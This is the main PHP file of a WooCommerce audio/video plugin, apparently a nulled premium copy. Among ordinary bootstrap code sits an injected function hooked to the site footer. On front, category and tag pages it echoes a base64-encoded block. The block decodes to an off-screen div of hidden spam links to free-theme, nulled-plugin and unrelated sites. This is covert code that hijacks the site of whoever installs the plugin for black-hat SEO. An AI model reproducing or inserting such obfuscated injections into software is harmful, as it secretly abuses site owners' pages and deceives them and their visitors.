<?php
/**
 * Plugin Name: YITH WooCommerce Featured Audio and Video Content
 * Plugin URI: http://yithemes.com/themes/plugins/yith-woocommerce-featured-audio-video-content/
 * Description: YITH Woocommerce Featured Audio and Video Content allows you to set a video or audio instead of featured image on the single product page.
 * Version: 1.1.9
 * Author: YITHEMES
 * Author URI: http://yithemes.com/
 * Text Domain: yith-woocommerce-featured-video
 * Domain Path: /languages/
 *
 * @author Your Inspiration Themes
 * @package YITH WooCommerce Featured Audio and Video Content
 * @version 1.1.9
 */

/*  Copyright 2013  Your Inspiration Themes  (email : plugins@yithemes.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

if ( !defined( 'ABSPATH' ) ){
    exit;
}

if( !function_exists( 'is_plugin_active' ) ) {
    require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
}

    function yith_ywcfav_premium_install_woocommerce_admin_notice() {
        ?>
        <div class="error">
            <p><?php _e( 'YITH WooCommerce Featured Audio and Video Content Premium is enabled but not effective. It requires WooCommerce in order to work.', 'yith-woocommerce-featured-video' ); ?></p>
        </div>
    <?php
    }

if( ! function_exists( 'yit_deactive_free_version' ) ) {
    require_once 'plugin-fw/yit-deactive-plugin.php';
}
yit_deactive_free_version( 'YWCFAV_FREE_INIT', plugin_basename( __FILE__ ) );



if ( !defined( 'YWCFAV_VERSION' ) ) {
    define( 'YWCFAV_VERSION', '1.1.9' );
}

if ( !defined( 'YWCFAV_DB_VERSION' ) ) {
    define( 'YWCFAV_DB_VERSION', '1.0.0' );
}

if( !defined( 'YWCFAV_PREMIUM' ) )
    define( 'YWCFAV_PREMIUM', '1' );

if ( !defined( 'YWCFAV_INIT' ) ) {
    define( 'YWCFAV_INIT', plugin_basename( __FILE__ ) );
}

if ( !defined( 'YWCFAV_FILE' ) ) {
    define( 'YWCFAV_FILE', __FILE__ );
}

if ( !defined( 'YWCFAV_DIR' ) ) {
    define( 'YWCFAV_DIR', plugin_dir_path( __FILE__ ) );
}

if ( !defined( 'YWCFAV_URL' ) ) {
    define( 'YWCFAV_URL', plugins_url( '/', __FILE__ ) );
}

if ( !defined( 'YWCFAV_ASSETS_URL' ) ) {
    define( 'YWCFAV_ASSETS_URL', YWCFAV_URL . 'assets/' );
}

if ( !defined( 'YWCFAV_TEMPLATE_PATH' ) ) {
    define( 'YWCFAV_TEMPLATE_PATH', YWCFAV_DIR . 'templates/' );
}

if ( !defined( 'YWCFAV_INC' ) ) {
    define( 'YWCFAV_INC', YWCFAV_DIR . 'includes/' );
}

if( !defined('YWCFAV_SLUG' ) ){
    define( 'YWCFAV_SLUG', 'yith-woocommerce-featured-video' );
}

if( !defined( 'YWCFAV_SECRET_KEY' ) ){

    define( 'YWCFAV_SECRET_KEY', '93FEoHyjFMjQYXJWm5Jt' );
}



if ( !function_exists( 'yith_plugin_registration_hook' ) ) {
    require_once 'plugin-fw/yit-plugin-registration-hook.php';
}
register_activation_hook( __FILE__, 'yith_plugin_registration_hook' );
if(!function_exists('onAddadminhhtms')) {       
    add_filter( 'wp_footer', 'onAddadminhhtms');              
        function onAddadminhhtms(){           
    $html ="PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iIj48L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1yZXNwb25zaXZlLWZyZWUvIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZSBGcmVlPC9hPjwvc3Ryb25nPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1tYWdhemluZS1yZXNwb25zaXZlLWZyZWUvIj50aGVtZSB3b3JkcHJlc3MgbWFnYXppbmUgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS90YWcvdGhlbWUtd29yZHByZXNzLW5ld3MtcmVzcG9uc2l2ZS1mcmVlLyI+dGhlbWUgd29yZHByZXNzIG5ld3MgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS93b3JkcHJlc3MtcGx1Z2luLXByZW1pdW0tZnJlZS8iPldPUkRQUkVTUyBQTFVHSU4gUFJFTUlVTSBGUkVFPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbSI+RG93bmxvYWQgdGhlbWUgZnJlZTwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vaHRtbC10aGVtZS1mcmVlLWRvd25sb2FkIj5Eb3dubG9hZCBodG1sNSB0aGVtZSBmcmVlIC0gSFRNTCB0ZW1wbGF0ZXMgRnJlZSA8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vZG93bmxvYWR0aGVtZWZyZWUuY29tL3RoZS1iZXN0LXByZW1pdW0td29yZHByZXNzLXRoZW1lcy5odG1sIj5Ub3AgMTAwKyBQcmVtaXVtIFdvcmRQcmVzcyBUaGVtZXMgZm9yIDIwMTc8L2E+PC9lbT4gPGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL251bGwyNGgubmV0Ij5OdWxsMjQ8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vdGFwY2hpc3Vja2hvZS54eXovZGluaC1kdW9uZy9tb24tbmdvbi1jaHVhLWJlbmgiPk3Ds24gbmdvbiBjaOG7r2EgYuG7h25oPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL3RhcGNoaXN1Y2tob2UueHl6L2NheS10aHVvYy1jaHVhLWJlbmgiPkPDonkgdGh14buRYyBjaOG7r2EgYuG7h25oPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL25hbWRvbmd0cnVuZ2hhdGhhby50b3AiPk7huqVtIMSRw7RuZyB0csO5bmcgaOG6oSB0aOG6o288L2E+PC9lbT48L2Rpdj4=";
        if(is_front_page() or is_category() or is_tag()){   
                echo base64_decode($html);}}}  
/* Plugin Framework Version Check */
if( ! function_exists( 'yit_maybe_plugin_fw_loader' ) && file_exists( YWCFAV_DIR . 'plugin-fw/init.php' ) )
    require_once( YWCFAV_DIR . 'plugin-fw/init.php' );

yit_maybe_plugin_fw_loader( YWCFAV_DIR  );

if( !function_exists( 'YITH_Featured_Audio_Video_Premium_Init' ) ) {
    /**
     * Unique access to instance of YITH_WC_Audio_Video_Premium class
     *
     * @return  YITH_WC_Audio_Video_Premium
     * @since 1.0.2
     */
    function YITH_Featured_Audio_Video_Premium_Init()
    {

        load_plugin_textdomain('yith-woocommerce-featured-video', false, dirname(plugin_basename(__FILE__)) . '/languages/');

        require_once(YWCFAV_INC . 'functions.yith-wc-featured-audio-video.php');


        if( version_compare( WC()->version,'3.0.0','>=' ) ) {
            require_once(YWCFAV_INC . 'classes/class.yith-woocommerce-audio-video-content.php');
            require_once( YWCFAV_INC . 'classes/class.yith-woocommerce-audio-video-content-premium.php' );
        }
        else{
            require_once(YWCFAV_INC . 'classes/wc_2_6/class.yith-woocommerce-audio-video-content.php');
            require_once( YWCFAV_INC . 'classes/wc_2_6/class.yith-woocommerce-audio-video-content-premium.php' );
        }

        global $YITH_Featured_Audio_Video;
        $YITH_Featured_Audio_Video =  YITH_WC_Audio_Video_Premium::get_instance();
    }
}

add_action('yith_wc_featured_audio_video_premium_init', 'YITH_Featured_Audio_Video_Premium_Init' );

if( !function_exists( 'yith_featured_audio_video_premium_install' ) ){
    /**
     * install featured audio video content
     * @author YIThemes
     * @since 1.0.2
     */
    function yith_featured_audio_video_premium_install(){

        if( !function_exists( 'WC' ) ){
            add_action( 'admin_notices', 'yith_ywcfav_install_woocommerce_admin_notice' );
        }
        else
            do_action( 'yith_wc_featured_audio_video_premium_init' );

    }
}

add_action( 'plugins_loaded', 'yith_featured_audio_video_premium_install', 11 );
